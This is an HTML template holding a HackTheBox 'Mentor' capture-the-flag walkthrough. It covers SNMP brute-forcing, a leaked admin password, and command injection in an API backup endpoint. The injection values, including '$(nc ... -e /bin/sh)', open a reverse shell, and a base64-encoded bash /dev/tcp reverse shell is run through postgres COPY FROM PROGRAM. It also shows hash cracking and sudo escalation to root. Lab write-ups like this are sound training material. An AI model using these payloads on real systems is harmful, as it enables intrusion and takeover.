@@ -1,0 +1,418 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Mentor</h1>
+    <p class="text">Difficutly : Medium | UserDifficulty : 5.1</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -sCV -p- &lt;target_ip&gt; --min-rate=2000</u>
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  tcpwrapped
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+</code></pre></div>
+
+<p class="text">Very simple output. Only HTTP and ssh are open on the target machine.</p>
+
+<p class="text">When I access to the target's website, the domain <u>http://mentorquotes.htb</u>is returned. I have to add this to /etc/hosts in this case.</p>
+
+<div class="code-box"><pre><code>└─$ <u>echo 'TARGET_IP mentorquotes.htb' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/mentor/1.png' %}" alt="">
+    <p class="text">This page doesn't hold any interesting information. I thought it may have secret info and read it, but it was waste of time af.</p>
+</div>
+
+<p class="text">In this case, we should enumerate the page's directories.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://mentorquotes.htb/</u>
+<u class="green">Because this box is little unstable, multi-thread enumeration may crush it.</u>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api.mentorquotes.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================</code></pre></div>
+
+<p class="text">Gobuster didn't return new director. It's possible that the pages are named uncommonly, we should change wordlist which has more plenty words.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://mentorquotes.htb/</u>
+<u class="green">Because this box is little unstable, multi-thread enumeration may crush it.</u>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api.mentorquotes.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================</code></pre></div>
+
+<p class="text">Though i used relatively big wordlist, it also didn't return new pages. Therefore, I prothesize the page doesn't have information and there is subdomain, or UDP ports are open.</p>
+
+<p class="text">I first enumerate subdomains with ffuf.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://mentorquotes.htb -H "Host:FUZZ.mentorquotes.htb" -mc 200,404 -s</u>
+api
+</code></pre></div>
+
+
+<p class="text">As I assumed, there is an api subdomain. <u>※You better to use -mc 200,404 because it may returns 404 when you access to subdomain.</u></p>
+
+<p class="text">Then, add the subdomain to /etc/hosts.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'TARGET_IP api.mentorquotes.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/mentor/2.png' %}" alt="">
+    <p class="text">The page also doesn't hold any information, so let's enumerate direcory again.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://api.mentorquotes.htb/</u>
+===============================================================
+/admin                (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/admin/]                                                                  
+/docs                 (Status: 200) [Size: 969]
+/quotes               (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/quotes/]                                                                 
+/server-status        (Status: 403) [Size: 285]
+/users                (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/users/]                                                                  
+Progress: 4746 / 4747 (99.98%)
+===============================================================</code></pre></div>
+
+<p class="text">This time, gobuster returned hidden path.</p>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/mentor/3.png' %}" alt="">
+    <p class="text">There are several api commands, but we are interested into /auth/signup funciton. It's worth testing. <br><br>We can follow documentation for testing.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>curl http://api.mentorquotes.htb/auth/signup -X POST -H 'Content-Type: application/json' -d'{"email":"test@mentor.htb","username":"testuser","password":"test123!"}'</u>
+
+    {"id":4,"email":"test@mentor.htb","username":"testuser"}</code></pre></div>
+
+<p class="text">It returned response which indicates our our testuser's id is 4, also means our test was successful. Next I try if I can login, and use admin api.</p>
+
+<div class="code-box"><pre><code>└─$ <u>curl api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d'{"email":"test@mentor.htb","username":"testuser","password":"test123!"}'</u>
+
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZW1haWwiOiJ0ZXN0QG1lbnRvci5odGIifQ.IidbR9H886aJmL8Gq23u3Ckoue8W1L7NWnSQrccHwFM" 
+
+┌──(kali㉿kali)-[~/tempo]
+└─$ <u>curl http://api.mentorquotes.htb/admin/ -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZW1haWwiOiJ0ZXN0QG1lbnRvci5odGIifQ.IidbR9H886aJmL8Gq23u3Ckoue8W1L7NWnSQrccHwFM'</u>
+
+    {"detail":"Unauthorized"}  </code></pre></div>
+
+
+<p class="text">Not suprisingly, our user is unauithorized. We need to find other vector to attack this site.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/mentor/4.png' %}" alt="">
+    <p class="text">At the top of the page, there is a link for <u>http://api.mentorquotes.htb/openapi.json</u>, and this page hold interesting information. The admin user would use the user <u>james:james@mentorquotes.htb</u>. However, we have no idea what password james use.</p>
+</div>
+
+
+<p class="text">We haven't performed UDP enumeration, which is important part of enumeration. UDP may holds valuable info.</p>
+
+<div class="code-box"><pre><code>└─$ <u>sudo nmap -sU -top-ports=100 IP --min-rate=2000</u>
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp</code></pre></div>
+
+
+<p class="text">SNMP is open on port 161.</p>
+
+<div class="code-box"><pre><code>└─$ snmpwalk -v 2c -c public IP</code></pre></div>
+
+<p class="text">Though it prints medium-sized lines, there is no usable information. However, though the default target is public, it may hold other target, and the tool <u>SNMP-Brute</u>, which enumerate brute automatically. Let's try it.</p>
+
+<div class="code-box"><pre><code>└─$ python3 snmpbrute.py -t 10.129.228.102
+
+   _____ _   ____  _______     ____             __     
+  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
+  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
+ ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
+/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 
+
+SNMP Bruteforce & Enumeration Script v2.0
+http://www.secforce.com / nikos.vassakis <at> secforce.com
+###############################################################
+
+Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
+10.129.228.102 : 161    Version (v2c):  internal
+10.129.228.102 : 161    Version (v1):   public
+10.129.228.102 : 161    Version (v2c):  public
+10.129.228.102 : 161    Version (v1):   public
+10.129.228.102 : 161    Version (v2c):  public
+Waiting for late packets (CTRL+C to stop)</code></pre></div>
+
+<p class="text">It revealed <u>internal</u>. We can re-enumerate with the target.</p>
+
+<div class="code-box"><pre><code>└─$ snmpwalk -v 2c -c internal IP > internal</code></pre></div>
+
+<p class="text">It returns tons of output, so redirects std-out to text file, and analyze it.</p>
+<div class="code-box"><pre><code>└─$ <u>cat internal | grep -Ei 'login|python|password|auth'</u>
+
+iso.3.6.1.2.1.25.4.2.1.4.1883 = STRING: "python3"
+iso.3.6.1.2.1.25.4.2.1.4.2005 = STRING: "python"
+iso.3.6.1.2.1.25.4.2.1.4.2030 = STRING: "/usr/local/bin/python3"
+iso.3.6.1.2.1.25.4.2.1.4.2031 = STRING: "/usr/local/bin/python3"
+iso.3.6.1.2.1.25.4.2.1.4.2110 = STRING: "/usr/bin/python3"
+iso.3.6.1.2.1.25.4.2.1.5.1672 = STRING: "/usr/local/bin/login.sh"
+iso.3.6.1.2.1.25.4.2.1.5.2110 = STRING: "/usr/local/bin/login.py <u>kj23sadkj123as0-d213</u>"
+iso.3.6.1.2.1.25.6.3.1.2.369 = STRING: "libpython3-dev_3.10.6-1~22.04_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.370 = STRING: "libpython3-stdlib_3.10.6-1~22.04_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.371 = STRING: "libpython3.10_3.10.6-1~22.04.1_amd64"</code></pre></div>
+
+
+<p class="text">It returned password, and may be for james admin.</p>
+
+
+<div class="code-box"><pre><code>└─$ curl api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d'{"email":"james@mentorquotes.htb","username":"james","password":"kj23sadkj123as0-d213"}'
+
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" </code></pre></div>
+
+<p class="text">It returned authentication key.</p>
+
+
+<div class="code-box"><pre><code>└─$ curl http://api.mentorquotes.htb/admin/ -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0'
+{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}} </code></pre></div>
+
+<p class="text">There are additional apis.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ curl http://api.mentorquotes.htb/admin/check -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0'
+{"details":"Not implemented yet!"}                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo]
+└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0'
+{"detail":"Method Not Allowed"}   </code></pre></div>
+
+
+<p class="text">The backup function seems to be working, and it says method not allowed, which imply we can POST or PUT some data.</p>
+
+<div class="code-box"><pre><code>└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{}'
+
+{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}  </code></pre></div>
+
+
+<p class="text">It may be requiring body and path variables.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{"body":"a","path":"a"}'
+
+{"INFO":"Done!"}</code></pre></div>
+
+<p class="text">Attaching body and path parameters successfully "Done". Also, the path may interacting with other href. We can check this with <u>python -m http.server</u> functionality.</p>
+
+
+<div class="code-box"><pre><code>└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{"path":"$(wget http://10.10.16.40:8000)"}'
+{"INFO":"Done!"}  
+
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.228.102 - - [19/Oct/2025 06:12:35] "GET / HTTP/1.1" 200 -</code></pre></div>
+
+<p class="text">With a command expantion method, I could cause RCE. We can use it for reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{"path":"$(nc 10.10.16.40:4444 -e /bin/sh)"}' 
+{"INFO":"Done!"}
+
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.228.102] 45259
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</code></pre></div>
+
+
+<p class="text">We got rev-shell with docker root.</p>
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Because we are in docker, we have to get out of this cage. One of the way we can get out of the container is, to move to other account. </p>
+<p class="text"><u>Docker creates a separate subnet (IP range) for each network and assigns container IP addresses from that range.</u> Therefore, we have to enumerate IP address of main target, or other dockers. We can do that with nmap, which we always use.</p>
+
+<p class="text">We can install binary file from <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap">here</a>. And serve it with python.</p>
+<div class="code-box"><pre><code>└─$ <u>wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap</u>
+└─$ <u>python3 -m http.server 8000</u></code></pre></div>
+
+<p class="text">Then, copy the file to the target machine.</p>
+
+<div class="code-box"><pre><code># wget http://IP:8000/nmap
+# chmod +x nmap
+# ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:16:00:03  
+          inet addr:<u>172.22.0.3</u>  Bcast:<u>172.22.255.255</u>  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:13259 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:11771 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:7233027 (6.8 MiB)  TX bytes:1162278 (1.1 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:4 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:248 (248.0 B)  TX bytes:248 (248.0 B)
+        
+# /tmp/nmapp -sn 172.22.0.0/24              <u class="green">/24 is often used in LAN.</u>
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-19 06:12 GMT     
+Nmap scan report for 172.22.0.1
+Host is up (0.000069s latency).
+MAC Address: 02:42:F7:E1:2E:CC (Unknown)
+Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
+Host is up (0.00024s latency).
+MAC Address: 02:42:AC:16:00:02 (Unknown)
+Nmap scan report for <u>docker_postgres_1.docker_vpcbr</u> (<u>172.22.0.4</u>)
+Host is up (0.000037s latency).
+MAC Address: 02:42:AC:16:00:04 (Unknown)
+Nmap scan report for 406ac46e336a (172.22.0.3)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 16.72 seconds
+/tmp/nmap 172.22.0.4</code></pre></div>
+
+
+<p class="text">A docker for postfres is open on 172.22.0.4. We can connect to the postgres with tunneling technique. For that, I will use <u>chisel</u>.</p>
+
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+└─$ ./chisel server -p 8001 --reverse
+</code></pre></div>
+
+<div class="code-box"><pre><code># wget http://IP:8000/chisel
+# chmod +x chiesl
+# ./chisel client YOUR_IP:8001 R:127.0.0.1:8002:172.22.0.4:5432</code></pre></div>
+
+<p class="text">Then, we can open postgres on our machine.</p>
+
+
+<div class="code-box"><pre><code>└─$ psql -U postgres -h 127.0.0.1 -p 8001
+postgres-# \du
+...
+
+-----------+------------------------------------------------------------
+ postgres  | <u>Superuser</u>, Create role, Create DB, Replication, Bypass RLS</code></pre></div>
+
+<p class="text">Here, we could logged in with default password <u>postgres:postgres</u>. And the \du command returned us the user is <u>Superuser</u>. Because we are superuser, we can use command which helps us to drop reverse shell.</p>
+
+<p class="text">Let's create reverse shell using cmd_exec function. First we have to prepare open port with nc, and encode reverse shell code with base64.</p>
+
+<div class="code-box"><pre><code>
+└─$ nc -lvnp 4444    
+└─$ echo "bash -c bash -i >& /dev/tcp/10.10.16.40/4444 0>&1" | base64;
+YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQwLzQ0NDQgMD4mMQo=
+</code></pre></div>
+
+<div class="code-box"><pre><code>postgres-# DROP TABLE IF EXISTS cmd_exec;
+NOTICE:  table "cmd_exec" does not exist, skipping
+DROP TABLE
+
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+CREATE TABLE
+
+postgres=# COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQwLzQ0NDQgMD4mMQo=|base64 -d|bash';</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.228.102] 44278
+id
+uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)</code></pre></div>
+
+<p class="text">We got postgres user.</p>
+
+
+<h2 class="subtitle">Lateral Movement 2</h2>
+<p class="text">While I enumerating directory, I found interesting file named <u>db_export.sql</u>.</p>
+
+<div class="code-box"><pre><code># cat db_export.sql
+...
+COPY public.users (id, email, username, password) FROM stdin;
+1       james@mentorquotes.htb  james   7ccdcd8c05b59add9c198d492b36a503
+35      svc@mentorquotes.htb    service_acc     53f22d0dfa10dce7e29cd31f4f953fd8
+\.
+...</code></pre></div>
+
+<p class="text">Because we know james' password, let's decode svc's user's password.</p>\
+
+
+<div class="code-box"><pre><code>└─$ echo 53f22d0dfa10dce7e29cd31f4f953fd8 > hash
+└─$ hashcat hash /usr/share/wordlists/rockyou.txt        
+...
+      0 | MD5                                                        | Raw Hash
+...</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ hashcat hash /usr/share/wordlists/rockyou.txt -m 0
+...
+53f22d0dfa10dce7e29cd31f4f953fd8:<u>123meunomeeivani</u>
+..</code></pre></div>
+
+<p class="text">Then, we can try ssh with svc user.</p>
+
+
+<h2 class="subtitle">Lateral Movement 3</h2>
+
+<div class="code-box"><pre><code>└─$ ssh svc@mentorquotes.htb
+Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
+svc@mentor:~$ id
+uid=1001(svc) gid=1001(svc) groups=1001(svc)</code></pre></div>
+
+
+<p class="text">Privilege escalation was simpler than I thought. Since the SNMP daemon was running on the server, we examine the SNMP configuration by accessing the
+snmpd.conf file.</p>
+
+
+<div class="code-box"><pre><code>svc@mentor:~$ cat /etc/snmp/snmpd.conf
+createUser bootstrap MD5 <u>SuperSecurePassword123__</u> DES</code></pre></div>
+
+<div class="code-box"><pre><code>svc@mentor:~$ su james
+Password: 
+james@mentor:/home/svc$ </code></pre></div>
+
+<p class="text">We got third user, james.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>james@mentor:/home/svc$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh</code></pre></div>
+
+    <p class="text">We can use /bin/sh as sudoer.</p>
+
+    <div class="code-box"><pre><code>james@mentor:/home/svc$ sudo /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">You can find root flag on /root/root.txt</p>
+
+
+</body>
+</html>
